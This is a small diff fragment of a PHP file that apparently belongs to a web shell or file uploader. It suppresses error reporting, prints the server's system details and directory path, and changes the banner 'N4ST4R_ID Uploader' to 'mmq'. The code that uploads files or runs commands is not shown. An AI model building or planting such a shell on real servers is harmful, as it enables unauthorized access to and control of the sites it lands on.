@@ -7,7 +7,7 @@ error_reporting(0);
 $dir = __DIR__;
 ?>
 
-N4ST4R_ID Uploader
+mmq
 <br>
 <b><?= php_uname(); ?></b><br>
 <b><?= $dir; ?></b><br><br>
